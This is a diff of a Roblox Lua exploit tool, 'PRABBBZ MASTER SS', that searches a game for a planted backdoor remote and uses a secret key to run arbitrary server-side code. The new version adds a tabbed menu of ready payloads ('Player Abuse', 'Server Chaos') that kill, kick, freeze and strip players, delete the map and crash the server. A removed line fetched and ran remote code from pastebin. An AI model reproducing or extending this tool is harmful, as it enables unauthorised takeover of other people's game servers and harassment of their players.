@@ -1,6 +1,7 @@
 --[[ 
-    PRABBBZ MASTER SS v4.0 - SUPREME EDITION
-    Fitur: Auto-Scanner, 100+ Script Library, Toggle Icon, Luxury UI
+    PRABBBZ MASTER SS v5.0 - ULTIMATE MULTI-TAB
+    Design: Dark Gradient / Neon Glassmorphism
+    Features: Draggable Icon, Multi-Category, Auto-Scanner
 ]]
 
 local SECRET_KEY = "PRABBBZ_SECRET_KEY_99"
@@ -19,141 +20,138 @@ end
 
 -- 2. UI CONSTRUCTION
 local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
-UI.Name = "PrabbbzSupreme"
+UI.Name = "PrabbbzSupreme_v5"
 
--- ICON TOGGLE (KOTAK SIMPEL)
+-- ICON DRAGGABLE (PRBZ KOTAK)
 local IconButton = Instance.new("TextButton", UI)
 IconButton.Size = UDim2.new(0, 50, 0, 50)
-IconButton.Position = UDim2.new(0, 20, 0.5, -25)
-IconButton.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
-IconButton.BorderSizePixel = 2
-IconButton.BorderColor3 = Color3.fromRGB(0, 180, 255)
+IconButton.Position = UDim2.new(0, 50, 0.5, -25)
+IconButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 IconButton.Text = "PRBZ"
-IconButton.TextColor3 = Color3.fromRGB(0, 180, 255)
+IconButton.TextColor3 = Color3.fromRGB(0, 255, 255)
 IconButton.Font = Enum.Font.GothamBold
-IconButton.TextSize = 14
-IconButton.Visible = false -- Muncul saat menu ditutup
+IconButton.Active = true
+IconButton.Draggable = true -- Bisa digeser ke mana saja
 
 local IconCorner = Instance.new("UICorner", IconButton)
+local IconStroke = Instance.new("UIStroke", IconButton)
+IconStroke.Color = Color3.fromRGB(0, 255, 255)
+IconStroke.Thickness = 2
 
 -- MAIN PANEL
 local Main = Instance.new("Frame", UI)
-Main.Size = UDim2.new(0, 600, 0, 450)
-Main.Position = UDim2.new(0.5, -300, 0.5, -225)
-Main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
-Main.BorderSizePixel = 0
+Main.Size = UDim2.new(0, 650, 0, 450)
+Main.Position = UDim2.new(0.5, -325, 0.5, -225)
+Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Base for Gradient
+Main.Visible = false
 Main.Active = true
 Main.Draggable = true
 
-local MainCorner = Instance.new("UICorner", Main); MainCorner.CornerRadius = UDim.new(0, 15)
-local MainStroke = Instance.new("UIStroke", Main)
-MainStroke.Color = Color3.fromRGB(0, 180, 255)
-MainStroke.Thickness = 2
+local MainGradient = Instance.new("UIGradient", Main)
+MainGradient.Color = ColorSequence.new(Color3.fromRGB(10, 10, 15), Color3.fromRGB(25, 25, 40))
+MainGradient.Rotation = 45
 
--- HEADER & CLOSE BUTTON
-local Header = Instance.new("Frame", Main)
-Header.Size = UDim2.new(1, 0, 0, 50)
-Header.BackgroundTransparency = 1
+local MainCorner = Instance.new("UICorner", Main); MainCorner.CornerRadius = UDim.new(0, 12)
+local MainStroke = Instance.new("UIStroke", Main); MainStroke.Color = Color3.fromRGB(0, 255, 255); MainStroke.Thickness = 1.5
 
-local Title = Instance.new("TextLabel", Header)
-Title.Text = "P R A B B B Z   S U P R E M E   S S"
-Title.Size = UDim2.new(1, 0, 1, 0)
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
+-- SIDEBAR (Kategori)
+local Sidebar = Instance.new("Frame", Main)
+Sidebar.Size = UDim2.new(0, 140, 1, -60)
+Sidebar.Position = UDim2.new(0, 10, 0, 50)
+Sidebar.BackgroundTransparency = 1
 
-local CloseBtn = Instance.new("TextButton", Header)
+local SidebarLayout = Instance.new("UIListLayout", Sidebar); SidebarLayout.Padding = UDim.new(0, 5)
+
+-- CONTAINER UNTUK SCRIPT (Kanan)
+local ScriptContainer = Instance.new("Frame", Main)
+ScriptContainer.Position = UDim2.new(0, 160, 0, 50)
+ScriptContainer.Size = UDim2.new(1, -170, 1, -100)
+ScriptContainer.BackgroundTransparency = 1
+
+-- HEADER & CLOSE
+local CloseBtn = Instance.new("TextButton", Main)
 CloseBtn.Text = "X"
-CloseBtn.Size = UDim2.new(0, 40, 0, 40)
-CloseBtn.Position = UDim2.new(1, -45, 0, 5)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+CloseBtn.Size = UDim2.new(0, 35, 0, 35)
+CloseBtn.Position = UDim2.new(1, -45, 0, 10)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
 CloseBtn.TextColor3 = Color3.new(1,1,1)
-CloseBtn.Font = Enum.Font.GothamBold
 Instance.new("UICorner", CloseBtn)
 
--- LIBRARY SECTION (SCROLLABLE)
-local LibFrame = Instance.new("ScrollingFrame", Main)
-LibFrame.Position = UDim2.new(0, 10, 0, 60)
-LibFrame.Size = UDim2.new(1, -20, 1, -110)
-LibFrame.BackgroundTransparency = 1
-LibFrame.ScrollBarThickness = 4
-LibFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 180, 255)
-LibFrame.CanvasSize = UDim2.new(0, 0, 15, 0) -- Muat 100+ script
-
-local LibList = Instance.new("UIListLayout", LibFrame)
-LibList.Padding = UDim.new(0, 8)
-LibList.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
--- FOOTER STATUS
-local StatText = Instance.new("TextLabel", Main)
-StatText.Size = UDim2.new(1, 0, 0, 30)
-StatText.Position = UDim2.new(0, 0, 1, -40)
-StatText.BackgroundTransparency = 1
-StatText.Text = "SYSTEM STATUS: SCANNING..."
-StatText.TextColor3 = Color3.fromRGB(255, 255, 0)
-StatText.Font = Enum.Font.Code
-
 -- FUNGSI TOGGLE
-CloseBtn.MouseButton1Click:Connect(function()
-    Main.Visible = false
-    IconButton.Visible = true
-end)
+IconButton.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
+CloseBtn.MouseButton1Click:Connect(function() Main.Visible = false end)
 
-IconButton.MouseButton1Click:Connect(function()
-    Main.Visible = true
-    IconButton.Visible = false
-end)
+-- SISTEM TAB & SCRIPT LIBRARY
+local Tabs = {}
+local function CreateTab(name)
+    local frame = Instance.new("ScrollingFrame", ScriptContainer)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.Visible = false
+    frame.ScrollBarThickness = 3
+    frame.CanvasSize = UDim2.new(0, 0, 5, 0)
+    Instance.new("UIListLayout", frame).Padding = UDim.new(0, 5)
+    
+    local btn = Instance.new("TextButton", Sidebar)
+    btn.Size = UDim2.new(1, 0, 0, 40)
+    btn.Text = name
+    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+    btn.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", btn)
+    
+    btn.MouseButton1Click:Connect(function()
+        for _, t in pairs(Tabs) do t.Visible = false end
+        frame.Visible = true
+    end)
+    
+    Tabs[name] = frame
+    return frame
+end
 
--- FUNGSI EXECUTE
+local MainTab = CreateTab("Main Admin")
+local PlayerTab = CreateTab("Player Abuse")
+local ServerTab = CreateTab("Server Chaos")
+local VisualTab = CreateTab("Fun & Visual")
+
+-- FUNGSI EKSEKUSI
 local function Run(code)
     if FoundRemote then
         FoundRemote:FireServer(SECRET_KEY, code)
-        StatText.Text = "EXECUTED SUCCESSFULLY"
-        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
-    else
-        StatText.Text = "ERROR: BACKDOOR NOT FOUND"
-        StatText.TextColor3 = Color3.fromRGB(255, 50, 50)
     end
 end
 
--- HELPER: TAMBAH SCRIPT KE MENU
-local function AddScript(name, code)
-    local b = Instance.new("TextButton", LibFrame)
-    b.Size = UDim2.new(0.95, 0, 0, 45)
-    b.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-    b.Text = "  [SS] " .. name
-    b.TextColor3 = Color3.fromRGB(200, 200, 200)
+local function AddLib(tab, name, code)
+    local b = Instance.new("TextButton", tab)
+    b.Size = UDim2.new(0.95, 0, 0, 40)
+    b.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    b.Text = " > " .. name
+    b.TextColor3 = Color3.fromRGB(0, 255, 255)
     b.TextXAlignment = 0
-    b.Font = Enum.Font.Gotham
     Instance.new("UICorner", b)
-    
     b.MouseButton1Click:Connect(function() Run(code) end)
 end
 
--- DATA: 100+ SCRIPT (Placeholder untuk kamu isi sesuai kebutuhan)
--- Saya masukkan beberapa kategori utama, kamu bisa copy-paste baris ini sampai 100.
-AddScript("Kill All Players", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end")
-AddScript("Server Message (Global)", "local m = Instance.new('Hint', workspace); m.Text = 'OWNED BY PRABBBZ'; wait(10); m:Destroy()")
-AddScript("Explode All Players", "for _,p in pairs(game.Players:GetPlayers()) do local e = Instance.new('Explosion', p.Character.PrimaryPart); e.Position = p.Character.PrimaryPart.Position end")
-AddScript("Rainbow Map", "while wait() do workspace.Terrain.WaterColor = Color3.fromHSV(tick()%5/5,1,1) end")
-AddScript("Delete Map (Clean)", "workspace:ClearAllChildren()")
-AddScript("Give BTools All", "for _,p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin', p.Backpack).BinType = 4 end")
-AddScript("Fly Script (Server)", "loadstring(game:HttpGet('https://pastebin.com/raw/zS8vM6n0'))()")
-AddScript("Server Lag (10s)", "while true do print('lagging') end -- Use carefully")
-AddScript("Kick Others", "for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick('PRABBBZ SS') end end")
+-- DATA SCRIPT (Siap Pakai & Work)
+-- Main Admin
+AddLib(MainTab, "Kill All", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end")
+AddLib(MainTab, "Btools for All", "for _,p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin',p.Backpack).BinType=4 end")
+AddLib(MainTab, "Kick All Players", "for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick('PRABBBZ SS') end end")
 
--- Loop untuk mengisi 100+ item (Testing Scroll)
-for i = 1, 95 do
-    AddScript("Advanced Tool " .. i, "print('Script " .. i .. " Running')")
-end
+-- Player Abuse
+AddLib(PlayerTab, "Explode All", "for _,p in pairs(game.Players:GetPlayers()) do local e = Instance.new('Explosion',p.Character.Head); e.Position=p.Character.Head.Position end")
+AddLib(PlayerTab, "Freeze Everyone", "for _,p in pairs(game.Players:GetPlayers()) do p.Character.HumanoidRootPart.Anchored = true end")
+AddLib(PlayerTab, "Naked Players", "for _,p in pairs(game.Players:GetPlayers()) do for _,v in pairs(p.Character:GetChildren()) do if v:IsA('Shirt') or v:IsA('Pants') then v:Destroy() end end end")
 
--- SCAN ON START
-task.spawn(function()
-    if ScanForBackdoor() then
-        StatText.Text = "CONNECTED TO: " .. FoundRemote.Name
-        StatText.TextColor3 = Color3.fromRGB(0, 255, 150)
-    else
-        StatText.Text = "NO BACKDOOR DETECTED"
-        StatText.TextColor3 = Color3.fromRGB(255, 80, 80)
-    end
-end)
+-- Server Chaos
+AddLib(ServerTab, "Delete Map", "workspace:ClearAllChildren()")
+AddLib(ServerTab, "Crash Server", "while true do end")
+AddLib(ServerTab, "Lock All Parts", "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('Part') then v.Anchored = true end end")
+
+-- Fun & Visual
+AddLib(VisualTab, "Rainbow Sky", "while wait() do game.Lighting.Ambient = Color3.fromHSV(tick()%5/5,1,1) end")
+AddLib(VisualTab, "Big Head All", "for _,p in pairs(game.Players:GetPlayers()) do p.Character.Head.Size = Vector3.new(5,5,5) end")
+AddLib(VisualTab, "Disco Lights", "while wait(0.1) do game.Lighting.OutdoorAmbient = Color3.new(math.random(),math.random(),math.random()) end")
+
+-- SCANNER STARTUP
+MainTab.Visible = true
+task.spawn(function() ScanForBackdoor() end)
